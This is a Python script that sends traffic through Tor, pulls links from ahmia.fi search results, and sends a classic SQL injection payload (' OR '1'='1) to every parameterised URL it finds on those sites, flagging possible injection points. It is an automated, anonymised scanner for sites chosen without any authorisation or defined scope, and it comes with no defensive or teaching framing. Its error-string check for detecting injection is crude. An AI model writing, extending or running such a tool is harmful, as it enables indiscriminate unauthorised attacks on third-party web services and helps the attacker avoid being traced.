import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table

console = Console()

def search_and_scan(query):
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    search_url = f"https://ahmia.fi/search/?q={query}"
    response = session.get(search_url)
    
    if response.status_code == 200:
        console.print("[bold yellow]Search results:[/bold yellow]")
        links = find_links(response.text)
        table = Table(title="Found Links")
        table.add_column("Link", justify="left", style="cyan", no_wrap=True)
        for link in links:
            table.add_row(link)
        console.print(table)
        for link in links:
            console.print(f"[bold blue]Visiting link: {link}[/bold blue]")
            scan_for_sql_injection(session, link)
    else:
        console.print("[bold red]Error opening the website.[/bold red]")

def find_links(html):
    soup = BeautifulSoup(html, 'html.parser')
    links = soup.find_all('a')
    valid_links = [link['href'] for link in links if link['href'].startswith('http')]
    return valid_links

def scan_for_sql_injection(session, url):
    try:
        response = session.get(url)
        if response.status_code == 200:
            dynamic_urls = find_dynamic_urls(response.text)
            if dynamic_urls:
                console.print(f"[bold yellow]Dynamic URLs found on {url}:[/bold yellow]")
                table = Table(title=f"Dynamic URLs on {url}")
                table.add_column("Dynamic URL", justify="left", style="cyan", no_wrap=True)
                for dynamic_url in dynamic_urls:
                    table.add_row(dynamic_url)
                    console.print(f"[bold blue]Checking for SQL injection: {dynamic_url}[/bold blue]")
                    check_sql_injection(session, dynamic_url)
                console.print(table)
            else:
                console.print(f"[bold yellow]No dynamic URLs found on {url}.[/bold yellow]")
        else:
            console.print(f"[bold red]Error opening the website {url}.[/bold red]")
    except Exception as e:
        console.print(f"[bold red]Error visiting {url}: {e}[/bold red]")

def find_dynamic_urls(html):
    soup = BeautifulSoup(html, 'html.parser')
    links = soup.find_all('a')
    dynamic_urls = [link['href'] for link in links if '?' in link['href']]
    return dynamic_urls

def check_sql_injection(session, url):
    sql_injection_payload = "' OR '1'='1"
    try:
        vulnerable_url = f"{url}{sql_injection_payload}"
        response = session.get(vulnerable_url)
        if "syntax error" in response.text.lower() or "sql" in response.text.lower():
            console.print(f"[bold red]Possible SQL injection point found: {url}[/bold red]")
        else:
            console.print(f"[bold green]No SQL injection detected for: {url}[/bold green]")
    except Exception as e:
        console.print(f"[bold red]Error testing {url} for SQL injection: {e}[/bold red]")
